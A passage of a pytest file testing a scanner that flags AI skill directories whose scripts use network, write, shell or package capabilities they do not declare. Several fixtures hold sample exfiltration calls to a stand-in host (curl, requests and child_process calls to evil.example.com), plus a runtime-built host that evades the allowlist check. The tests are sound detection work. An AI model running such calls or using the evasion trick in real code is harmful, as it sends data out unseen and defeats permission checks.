    never depends on script content at all -- an unparseable script must
    not suppress it, even though it DOES suppress the sibling
    deterministic over-declared warning (see
    test_unparseable_script_suppresses_over_declared_warning)."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example Skill\n\n## Steps\n\n1. Read the input.\n",
        scripts={"broken.py": "def f(:\n    pass\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert not any(f.kind == "deterministic" for f in findings)
    assert any(f.kind == "heuristic" for f in findings)


# ---- find_packages_drift: kind/severity tagging ----


def test_packages_under_declared_finding_carries_deterministic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_packages_drift(None, skill_dir)
    assert findings and all(f.kind == "deterministic" for f in findings)


def test_packages_over_declared_finding_carries_deterministic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md=_compat_skill_md("requests"))
    findings = scanner.find_packages_drift({"pip": ["requests"]}, skill_dir)
    assert findings and all(f.kind == "deterministic" for f in findings)


def test_packages_compatibility_finding_carries_heuristic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import yaml\n"})
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    heuristic = [f for f in findings if f.kind == "heuristic"]
    assert heuristic and all(f.severity == "warning" for f in heuristic)


# ---- _extract_compatibility_field (direct unit tests) ----


def test_extract_compatibility_field_double_quoted() -> None:
    text = '---\nname: x\ncompatibility: "Requires pyyaml."\n---\n\nBody.\n'
    assert scanner._extract_compatibility_field(text) == "Requires pyyaml."


def test_extract_compatibility_field_single_quoted() -> None:
    text = "---\nname: x\ncompatibility: 'Requires pyyaml.'\n---\n\nBody.\n"
    assert scanner._extract_compatibility_field(text) == "Requires pyyaml."


def test_extract_compatibility_field_plain_unquoted() -> None:
    text = "---\nname: x\ncompatibility: Requires pyyaml.\n---\n\nBody.\n"
    assert scanner._extract_compatibility_field(text) == "Requires pyyaml."


def test_extract_compatibility_field_absent_key_returns_empty() -> None:
    text = "---\nname: x\ndescription: y\n---\n\nBody.\n"
    assert scanner._extract_compatibility_field(text) == ""


def test_extract_compatibility_field_no_frontmatter_returns_empty() -> None:
    assert scanner._extract_compatibility_field("# Just a heading\n\nNo frontmatter here.\n") == ""


def test_extract_compatibility_field_unclosed_frontmatter_returns_empty() -> None:
    text = "---\nname: x\ncompatibility: pyyaml\n\n# No closing delimiter\n"
    assert scanner._extract_compatibility_field(text) == ""


def test_extract_compatibility_field_empty_text_returns_empty() -> None:
    assert scanner._extract_compatibility_field("") == ""


def test_extract_compatibility_field_leading_bom_is_stripped() -> None:
    bom = chr(65279)  # U+FEFF -- avoids a literal backslash-u escape in this source file
    text = bom + '---\nname: x\ncompatibility: "Requires pyyaml."\n---\n\nBody.\n'
    assert scanner._extract_compatibility_field(text) == "Requires pyyaml."


def test_extract_compatibility_field_crlf_line_endings_still_extracts(tmp_path: pathlib.Path) -> None:
    """Regression pin for a bug found live by this function's own required
    independent adversarial review (issue #1121): without CRLF
    normalization, a trailing "\\r" stays attached to the "---"
    frontmatter delimiter's own line, so _FRONTMATTER_BLOCK_RE's literal
    "\\n" immediately after "---[ \\t]*" never matches at all -- the whole
    frontmatter block silently failed to match, and _extract_
    compatibility_field returned "" for a CRLF-saved SKILL.md exactly as
    if it had no frontmatter at all. Before the fix, this test's own
    assertion failed (got "" instead of the real value). Same class of
    bug this repository's own .github/scripts/
    gitapex_gate_stdlib_only_claim_drift.py already fixed once, for a
    different file (a trailing "\\r" on a `+++ b/<path>` diff header)."""
    text = '---\r\nname: x\r\ncompatibility: "Requires pyyaml."\r\n---\r\n\r\nBody.\r\n'
    assert scanner._extract_compatibility_field(text) == "Requires pyyaml."


def test_compatibility_check_tolerates_crlf_skill_md_end_to_end(tmp_path: pathlib.Path) -> None:
    """End-to-end proof (not just the direct helper unit test above): a
    real CRLF-saved SKILL.md correctly satisfies the compatibility-mention
    check through find_packages_drift's own full call path."""
    skill_dir = tmp_path / "crlf-skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_bytes(
        b'---\r\nname: crlf-skill\r\ndescription: x\r\ncompatibility: "Requires pyyaml."\r\n---\r\n\r\nBody.\r\n'
    )
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "fetch.py").write_text("import yaml\n", encoding="utf-8")
    assert scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir) == []


def test_extract_compatibility_field_body_mention_outside_frontmatter_is_ignored() -> None:
    """A body heading or prose sentence starting a line with
    "compatibility:" must never be mistaken for the real frontmatter
    field -- proves _COMPATIBILITY_FIELD_RE is applied only to the
    captured frontmatter interior, not the whole file."""
    text = "---\nname: x\ndescription: y\n---\n\n## compatibility: not the real field\n"
    assert scanner._extract_compatibility_field(text) == ""


def test_extract_compatibility_field_body_containing_its_own_thematic_break_before_close() -> None:
    """Documents the DISCLOSED, narrower guarantee this regex actually
    provides (see _COMPATIBILITY_FIELD_RE's own corrected comment): the
    frontmatter boundary is the FIRST "---"-only line paired with the
    very NEXT "---"-only line -- the same delimiter-pairing contract
    gitapex_check_skill_shape.py's own _parse_frontmatter already uses
    (live-verified to behave identically to it on this exact input), but
    neither parser validates that every intervening line is itself a
    well-formed "key: value" pair. A body containing its own bare "---"
    thematic break (legal Markdown/CommonMark) with no EARLIER closing
    delimiter is, by this shared boundary rule, genuinely captured as
    "frontmatter interior," so a "compatibility:"-shaped line inside it
    still matches -- an earlier version of this comment overclaimed a
    body-level compatibility line "can never match," which was false, and
    is the current, still-accurate, disclosed behavior this test pins."""
    text = "---\n\nSome body\n\ncompatibility: pyyaml is needed\n\n---\n"
    assert scanner._extract_compatibility_field(text) == "pyyaml is needed"


def test_extract_compatibility_field_body_mention_after_a_real_frontmatter_close_with_a_later_stray_delimiter_is_ignored() -> (
    None
):
    """What IS still guaranteed, proven concretely alongside the disclosed
    limitation above: a real, TIGHTLY-CLOSED frontmatter block (an early
    second "---"-only line) correctly excludes a LATER "compatibility:"
    mention in the body, even one followed by its own further stray
    "---" -- the non-greedy match closes at the FIRST "---", not a later
    one, so this is not a case of the two regexes "getting confused" by
    multiple delimiters in general."""
    text = "---\nname: x\n---\n\nBody prose.\n\ncompatibility: should-not-match-body\n\n---\nmore body\n"
    assert scanner._extract_compatibility_field(text) == ""


# ---- find_drift (integration) ----


def _write_sidecar(
    skill_dir: pathlib.Path,
    execution_requirements: dict[str, object],
    *,
    packages: dict[str, list[str]] | None = None,
) -> None:
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    # packages is a SEPARATE keyword-only param, not folded into the
    # existing execution_requirements mini-DSL dict: every existing
    # caller keeps working with zero changes (backward compatible), and
    # a real packages.pip value is itself a nested ecosystem->list
    # mapping, not a scalar/single-list like network_mode/write_tags/
    # shell_tags -- str(package_list) below relies on the same
    # already-established trick execution_requirements' own write_tags/
    # shell_tags rendering uses: a Python list-of-strings' own str()
    # happens to be valid YAML flow-sequence syntax (single-quoted
    # scalars), so no real YAML serializer is needed for this test-only
    # fixture writer.
    packages_yaml = ""
    if packages is not None:
        packages_yaml = "    packages:\n" + "".join(
            f"      {ecosystem}: {package_list}\n" for ecosystem, package_list in packages.items()
        )
    (metadata_dir / "gitapex.yaml").write_text(
        "apiVersion: gitapex.io/v1alpha1\n"
        "kind: SkillMetadata\n"
        f"metadata:\n  name: {skill_dir.name}\n"
        "spec:\n"
        "  executionRequirements:\n"
        f"    network:\n      mode: {execution_requirements.get('network_mode', 'disabled')}\n"
        f"    tools:\n"
        f"      write: {execution_requirements.get('write_tags', [])}\n"
        f"      shell: {execution_requirements.get('shell_tags', [])}\n"
        f"{packages_yaml}",
        encoding="utf-8",
    )


def test_find_drift_wires_network_and_tools_checks_end_to_end(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"fetch.py": "import urllib.request\n"},
    )
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    messages = [f.message for f in findings]
    assert any("network-mode-vs-script-content" in m and m.startswith("example-skill:") for m in messages)
    assert any("tools-write-vs-skill-md" in m and m.startswith("example-skill:") for m in messages)


def test_find_drift_wires_packages_check_end_to_end(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Read the input.\n",
        scripts={"fetch.py": "import yaml\n"},
    )
    _write_sidecar(
        skill_dir,
        {"network_mode": "disabled", "write_tags": [], "shell_tags": []},
        packages={"pip": []},
    )

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    messages = [f.message for f in findings]
    assert any("packages-pip-vs-script-content" in m and m.startswith("example-skill:") for m in messages)


def test_find_drift_below_floor_is_error(tmp_path: pathlib.Path) -> None:
    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=5)
    assert _severities(findings) == ["error"]
    assert "skill-discovery-floor" in findings[0].message


def test_find_drift_missing_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    _make_skill(tmp_path)
    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
    assert _severities(findings) == ["error"]
    assert "metadata-file-present" in findings[0].message


# ---- find_skill_drift (single-target, the CLI's own entry point) ----


def test_find_skill_drift_wires_network_and_tools_checks(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"fetch.py": "import urllib.request\n"},
    )
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})

    findings = scanner.find_skill_drift(skill_dir)

    messages = [f.message for f in findings]
    assert any("network-mode-vs-script-content" in m for m in messages)
    assert any("tools-write-vs-skill-md" in m for m in messages)
    # Unlike find_drift(), messages carry no skill-name prefix -- single-target use.
    assert not any(m.startswith("example-skill:") for m in messages)


def test_find_skill_drift_wires_packages_check(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Read the input.\n",
        scripts={"fetch.py": "import yaml\n"},
    )
    _write_sidecar(
        skill_dir,
        {"network_mode": "disabled", "write_tags": [], "shell_tags": []},
        packages={"pip": []},
    )

    findings = scanner.find_skill_drift(skill_dir)

    messages = [f.message for f in findings]
    assert any("packages-pip-vs-script-content" in m for m in messages)


def test_find_skill_drift_missing_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    findings = scanner.find_skill_drift(skill_dir)
    assert _severities(findings) == ["error"]
    assert "metadata-file-present" in findings[0].message


def test_find_skill_drift_invalid_yaml_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text("key: [unclosed\n", encoding="utf-8")

    findings = scanner.find_skill_drift(skill_dir)

    assert _severities(findings) == ["error"]
    assert "not valid YAML" in findings[0].message


def test_find_skill_drift_clean_skill_has_no_findings(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
    assert scanner.find_skill_drift(skill_dir) == []


# ---- main() CLI ----


def test_main_requires_a_target_argument() -> None:
    with pytest.raises(SystemExit):
        scanner.main([])


def test_main_nonexistent_target_fails_loudly(capsys: pytest.CaptureFixture[str]) -> None:
    exit_code = scanner.main(["some/nonexistent/skill/dir"])
    assert exit_code == 1
    assert "is not a skill directory" in capsys.readouterr().out


def test_main_clean_tree_exits_zero(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(scanner, "find_skill_drift", lambda skill_dir: [])
    assert scanner.main([str(tmp_path)]) == 0


def test_main_warning_only_exits_zero(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        scanner,
        "find_skill_drift",
        lambda skill_dir: [scanner.Finding("warning", "heuristic", "some over-declaration")],
    )
    assert scanner.main([str(tmp_path)]) == 0


def test_main_error_exits_one(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        scanner,
        "find_skill_drift",
        lambda skill_dir: [scanner.Finding("error", "deterministic", "some under-declaration")],
    )
    assert scanner.main([str(tmp_path)]) == 1


def test_main_end_to_end_against_a_real_skill_dir_no_mocking(
    tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """No monkeypatching -- proves the CLI wiring (argument parsing ->
    find_skill_drift -> exit code) works end to end, not just that main()
    correctly reacts to a mocked find_skill_drift."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
    )
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})

    exit_code = scanner.main([str(skill_dir)])

    assert exit_code == 1
    captured = capsys.readouterr()
    assert "tools-write-vs-skill-md" in captured.out


# ---- missing PyYAML dependency (issue #1076) ----


def test_missing_pyyaml_exits_with_clear_message_not_a_traceback(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Issue #1076: this module's own top-level `import yaml` used to be
    unguarded, so a surface without the dev dependency group installed
    (pyproject.toml declares PyYAML only under `[dependency-groups] dev`,
    never a root `dependencies` entry) raised a raw, unhandled
    ModuleNotFoundError with no actionable next step. Simulates that
    surface without a real PyYAML-less venv: setting `sys.modules["yaml"]
    = None` is CPython's own documented mechanism for making a subsequent
    `import yaml` raise ModuleNotFoundError (see importlib._bootstrap.
    _find_and_load). Runs the script fresh via `runpy.run_path(...,
    run_name="__main__")` rather than `importlib.import_module()`: a
    second /code-review pass live-verified that the guard's SystemExit(2)
    only fires under `__name__ == "__main__"` (see the regression test
    below for why), and run_path is the standard-library way to execute a
    file as if it were `__main__` in-process, without a real subprocess.
    A still-unguarded import would let ModuleNotFoundError itself escape
    `pytest.raises(SystemExit)` uncaught, failing this test loudly rather
    than silently -- the defeat case this test exists to rule out."""
    monkeypatch.setitem(sys.modules, "yaml", None)
    script_path = str(pathlib.Path(scanner.__file__))

    with pytest.raises(SystemExit) as exc_info:
        runpy.run_path(script_path, run_name="__main__")

    assert exc_info.value.code == 2
    stderr = capsys.readouterr().err
    assert "PyYAML" in stderr
    assert "uv sync --group dev" in stderr


def test_missing_pyyaml_on_plain_import_propagates_cleanly_not_systemexit(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Regression test for a bug a second /code-review pass caught before
    merge (issue #1076): the guard originally converted a missing PyYAML
    into SystemExit(2) unconditionally, including when this module is
    merely *imported* rather than run as a script. Live-verified in an
    isolated PyYAML-less venv: pytest *collecting* this file's own
    `import ... as scanner` line with that unconditional guard produced
    INTERNALERROR (exit 3, "caught unexpected SystemExit") instead of the
    clean "ERROR collecting" report (exit 2) the pre-#1076 unguarded
    `import yaml` produced -- a strictly worse failure mode in exactly the
    environment this guard exists to help. Asserts the fix: a plain
    import with PyYAML missing must let ModuleNotFoundError itself
    propagate, matching pre-#1076 behavior, not be converted to
    SystemExit -- reusing the already-imported `scanner` object here
    would skip the guard entirely and let this test pass vacuously, so
    this evicts the cached module first to force a fresh top-level exec,
    the same way the CLI-path test above does."""
    module_name = "gitapex_scan_execution_requirements_drift"
    monkeypatch.setitem(sys.modules, "yaml", None)
    monkeypatch.delitem(sys.modules, module_name, raising=False)

    with pytest.raises(ModuleNotFoundError) as exc_info:
        importlib.import_module(module_name)

    assert exc_info.value.name == "yaml"


def test_broken_yaml_installation_error_propagates_unmodified(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Adversarial-review finding on this same guard (issue #1076): a
    ModuleNotFoundError raised from INSIDE an already-found but
    broken/partial PyYAML install (e.g. one of its own internal
    submodules missing) carries error.name == "yaml.<submodule>", not
    "yaml" -- a live probe against a deliberately broken fake `yaml`
    package confirmed this exact shape. This guard's own remediation
    ("install the dev dependency group") would not fix a corrupted
    install, so misreporting it as a plain missing-PyYAML case would send
    a reader chasing the wrong problem. Simulated via builtins.__import__
    patching (distinct from the missing-package test above's
    sys.modules-value-None trick, since there is no single sys.modules
    entry that represents "this package exists but one of its own
    internal imports fails") -- asserts the ORIGINAL ModuleNotFoundError
    propagates uncaught, not converted to this guard's SystemExit(2)."""
    module_name = "gitapex_scan_execution_requirements_drift"
    real_import = builtins.__import__

    def _fake_import(name: str, *args: object, **kwargs: object) -> object:
        if name == "yaml":
            raise ModuleNotFoundError("No module named 'yaml.tokens'", name="yaml.tokens")
        return real_import(name, *args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(builtins, "__import__", _fake_import)
    monkeypatch.delitem(sys.modules, module_name, raising=False)

    with pytest.raises(ModuleNotFoundError) as exc_info:
        importlib.import_module(module_name)

    assert exc_info.value.name == "yaml.tokens"


# ---- error-path coverage: discover_skill_dirs / _load_sidecar / _spec_of ----


def test_discover_skill_dirs_missing_directory_is_empty(tmp_path: pathlib.Path) -> None:
    assert scanner.discover_skill_dirs(tmp_path / "does-not-exist") == []


def test_load_sidecar_nonexistent_file_raises_read_error(tmp_path: pathlib.Path) -> None:
    with pytest.raises(scanner.ReadError, match="cannot be read"):
        scanner._load_sidecar(tmp_path / "missing.yaml")


def test_load_sidecar_non_utf8_raises_read_error(tmp_path: pathlib.Path) -> None:
    path = tmp_path / "bad-encoding.yaml"
    path.write_bytes(b"\xff\xfe not utf-8")
    with pytest.raises(scanner.ReadError, match="not valid UTF-8"):
        scanner._load_sidecar(path)


def test_load_sidecar_invalid_yaml_raises_read_error(tmp_path: pathlib.Path) -> None:
    path = tmp_path / "bad.yaml"
    path.write_text("key: [unclosed\n", encoding="utf-8")
    with pytest.raises(scanner.ReadError, match="not valid YAML"):
        scanner._load_sidecar(path)


def test_load_sidecar_deeply_nested_yaml_raises_read_error(tmp_path: pathlib.Path) -> None:
    # Regression pin: RecursionError is not a yaml.YAMLError subclass, so a
    # deeply nested flow-sequence sidecar used to propagate an uncaught
    # RecursionError straight out of _load_sidecar, crashing the whole scan
    # instead of reporting one clean ReadError the way every other
    # malformed-input case here does -- the same bug this module's own
    # sibling, gitapex_scan_skill_metadata_schema.py's load_sidecar,
    # already fixed, that this duplicated copy had not carried forward.
    path = tmp_path / "deep.yaml"
    path.write_text("key: " + "[" * 3000 + "]" * 3000, encoding="utf-8")
    with pytest.raises(scanner.ReadError, match="too deeply nested"):
        scanner._load_sidecar(path)


def test_read_text_best_effort_on_directory_returns_empty(tmp_path: pathlib.Path) -> None:
    directory = tmp_path / "a-directory"
    directory.mkdir()
    assert scanner._read_text_best_effort(directory) == ""


def test_spec_of_non_dict_instance_is_empty() -> None:
    assert scanner._spec_of(["not", "a", "dict"]) == {}


def test_find_drift_invalid_yaml_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text("key: [unclosed\n", encoding="utf-8")

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    assert _severities(findings) == ["error"]
    assert "not valid YAML" in findings[0].message


def test_find_drift_non_dict_execution_requirements_is_tolerated(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text(
        "apiVersion: gitapex.io/v1alpha1\n"
        "kind: SkillMetadata\n"
        f"metadata:\n  name: {skill_dir.name}\n"
        "spec:\n"
        "  executionRequirements: not-a-mapping\n",
        encoding="utf-8",
    )

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    assert findings == []


# ---- defeat tests: adversarially probing the detection logic itself,
# not just its happy path (evaluating-deterministic-gate-quality dimension
# 15's own instruction: "independently construct and run a malformed,
# boundary, or missing-dependency input directly against the gate before
# crediting this dimension") ----


def test_malformed_execution_requirements_still_fail_closed_on_real_usage(tmp_path: pathlib.Path) -> None:
    """Dimension 15 proof: a garbage (non-mapping) executionRequirements
    value must NOT silently read as "nothing to check" when the skill's
    real content actually performs the capability that would have been
    gated -- it must fall back to the strictest defaults (network
    'disabled', tools not declared) and still flag the real usage as an
    error, not silently pass because the declaration itself was malformed."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"fetch.py": "import urllib.request\n"},
    )
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text(
        "apiVersion: gitapex.io/v1alpha1\n"
        "kind: SkillMetadata\n"
        f"metadata:\n  name: {skill_dir.name}\n"
        "spec:\n"
        "  executionRequirements: [1, 2, 3]\n",
        encoding="utf-8",
    )

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    messages = [f.message for f in findings]
    assert any("network-mode-vs-script-content" in m for m in messages)
    assert any("tools-write-vs-skill-md" in m for m in messages)
    assert all(f.severity == "error" for f in findings)


def test_dynamically_constructed_host_evades_allowlist_check(tmp_path: pathlib.Path) -> None:
    """Attempted evasion of the allowlist out-of-list-host check: a host
    built at runtime from string concatenation, rather than appearing as a
    literal https?://host substring, is genuinely invisible to
    _URL_HOST_PATTERN's regex-only matching. This is NOT a passing
    detection -- it is the documented false-negative limitation
    (module docstring: "a network call routed through an unlisted helper,
    or dynamic/reflective invocation, can still slip through undetected")
    proven concretely rather than only asserted in prose. If a future
    change to find_network_drift starts catching this case, this test's
    own assertion (== []) will fail and must be updated deliberately, not
    silently -- it is not a regression to fix quietly."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": ('import requests\nhost = "evil" + ".example.com"\nrequests.get(f"https://{host}/x")\n')},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert findings == []


def test_non_python_bundled_scripts_get_heuristic_network_scan(tmp_path: pathlib.Path) -> None:
    """Issue #1079: _bundled_script_trees only globs scripts/*.py, so a
    bundled .sh script making a real, unmistakable network call (curl) used
    to be completely invisible to find_network_drift and silently scored
    clean -- this was previously pinned as the intentional status quo by
    this same test (named test_non_python_bundled_scripts_are_not_scanned,
    asserting == []); the fix corrects that expectation deliberately, not
    silently, per the issue's own requested outcome. The .sh script is now
    caught by the heuristic (kind="heuristic") non-Python lane, alongside
    the equivalent Python script's own pre-existing deterministic catch."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://evil.example.com/exfiltrate\n"})

    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)

    assert len(findings) == 1
    assert findings[0].kind == "heuristic"
    assert "network-command-in-non-python-script" in findings[0].message
    assert "fetch.sh" in findings[0].message

    # Sanity check: the equivalent Python script IS caught too, via the
    # pre-existing deterministic AST lane -- proving this is an added
    # detection path, not a change to the Python-script behavior.
    py_skill_dir = _make_skill(
        tmp_path,
        name="example-skill-py",
        scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com/exfiltrate")\n'},
    )
    py_findings = scanner.find_network_drift({"mode": "disabled"}, py_skill_dir)
    assert len(py_findings) == 1
    assert py_findings[0].kind == "deterministic"


def test_benign_non_python_bundled_script_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Negative case for the new heuristic lane (issue #1079): a bundled
    .sh script with no network-capable command must not be flagged, even
    under network.mode: disabled -- guards against a fail-closed-everything
    regression where any non-Python script at all gets scored as drift,
    the exact false-positive cost the issue's own trade-off investigation
    rejected as too high for a zero-content-analysis alternative."""
    skill_dir = _make_skill(tmp_path, scripts={"greet.sh": "#!/bin/bash\necho 'hello from a benign script'\n"})

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_non_python_network_command_does_not_trigger_unrestricted_over_declared_warning(
    tmp_path: pathlib.Path,
) -> None:
    """A skill correctly declaring network.mode: unrestricted with only a
    non-Python (.sh) script performing real network I/O must not be
    penalized with the over-declared warning -- that warning is meant for
    a skill with genuinely no network-capable content of any kind, not one
    whose only evidence happens to live in a language this scanner cannot
    AST-parse."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://example.com/data\n"})

    assert scanner.find_network_drift({"mode": "unrestricted"}, skill_dir) == []


def test_non_python_test_file_is_excluded_from_network_scan(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): the new
    non-Python lane originally had no equivalent of _bundled_script_trees'
    own "test_" prefix exclusion, so a bundled non-Python test/fixture
    script performing a real network call against a mock or local test
    endpoint -- entirely legitimate test-only content, not the skill's own
    shipped capability -- was misattributed as real drift, the identical
    bug this module already fixed once for Python
    (test_bundled_test_file_is_excluded_from_script_content_scanning,
    elsewhere in this file) reappearing for every other language."""
    skill_dir = _make_skill(tmp_path, scripts={"test_fetch.sh": "#!/bin/bash\ncurl https://mock.example.com/x\n"})

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_unreadable_non_python_script_is_undetermined_not_clean(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): a non-UTF-8
    bundled non-Python script used to be silently scored clean (an
    unreadable file contributed no pattern matches), the exact
    assume-clean outcome _bundled_script_trees' own docstring already
    refuses for the parallel unparseable-.py case ("an inability to
    verify is a deny, not an assume-clean"). Now surfaced as its own
    "non-python-script-unreadable" finding, unconditionally (regardless of
    declared network.mode, mirroring network-script-unparseable's own
    unconditional treatment) -- an unreadable file's real content, and
    thus its compliance with any declared mode, is genuinely unknown."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "fetch.sh").write_bytes(b"#!/bin/bash\n\xff\xfe not valid utf-8\n")

    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)

    assert len(findings) == 1
    assert findings[0].severity == "error"
    assert findings[0].kind == "deterministic"
    assert "non-python-script-unreadable" in findings[0].message
    assert "fetch.sh" in findings[0].message


def test_non_python_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079) against this
    repository's own
    skills/executing-a-branch-plan/scripts/check_task_bash_safety.sh: a
    non-Python script that mentions "curl"/"wget" only inside a '#'
    comment (documenting, not performing, a fetch-and-execute pattern) was
    misreported as real network usage -- a false positive the AST lane
    structurally cannot produce, since a real parse tree has no comment
    nodes at all (module docstring). A whole-line comment is now stripped
    before the heuristic pattern runs, closing this specific gap."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "example.sh": (
                "#!/bin/bash\n"
                "# Example: piping curl or wget into a shell interpreter is dangerous.\n"
                "echo 'this script performs no network I/O of its own'\n"
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_non_python_slash_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Found live by a CodeRabbit adversarial review round (issue #1079):
    _SCRIPT_EXTENSIONS includes .js/.mjs/.ts/.php, whose whole-line comment
    marker is '//', not '#' -- a comment-only mention of "curl" in a
    bundled .js script was NOT stripped by the '#'-only pattern and still
    produced a false finding. _strip_line_comments now dispatches on the
    file's own suffix; real (non-comment) usage in the same language must
    still be caught."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "fetch.js": (
                "// Example: piping curl or wget into a shell interpreter is dangerous.\n"
                "console.log('this script performs no network I/O of its own');\n"
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []

    # Sanity check: real (non-comment) usage in the same language IS caught.
    real_skill_dir = _make_skill(
        tmp_path,
        name="example-skill-js",
        scripts={"fetch.js": "require('child_process').exec('curl https://evil.example.com/exfiltrate');\n"},
    )
    assert scanner.find_network_drift({"mode": "disabled"}, real_skill_dir) != []


def test_non_python_batch_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Same fix as test_non_python_slash_comment_only_network_mention_
    produces_no_finding, for Windows batch (.bat/.cmd) files, whose
    whole-line comment markers are "REM" and "::" -- neither of which the
    '#'/'//' patterns recognize."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "fetch.bat": (
                "REM Example: piping curl or wget is dangerous.\n"
                ":: another comment mentioning wget\n"
                "echo this script performs no network I/O of its own\n"
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_non_python_quoted_network_command_text_still_produces_finding(tmp_path: pathlib.Path) -> None:
    """Disclosed residual limitation (issue #1079), proven concretely
    rather than only asserted in the module docstring: a network-capable
    command name quoted as text inside an unrelated string/regex literal
    on a real (non-comment) code line -- as this repository's own
    check_task_bash_safety.sh's fetch_exec_re variable does, quoting
    "curl|wget" as detection text for its own safety gate, not as an
    invocation -- is NOT excluded by the comment-line stripping fix and
    still produces a finding. This is NOT a passing detection; it is the
    same class of imprecision this module's own SKILL.md prose heuristic
    (_SHELL_INTENT_PATTERN/_WRITE_INTENT_PATTERN) already carries
    unmitigated for negated/quoted/example text, deliberately not chased
    further here. If a future change starts excluding this case, this
    test's own assertion must be updated deliberately, not silently."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "check_safety.sh": (
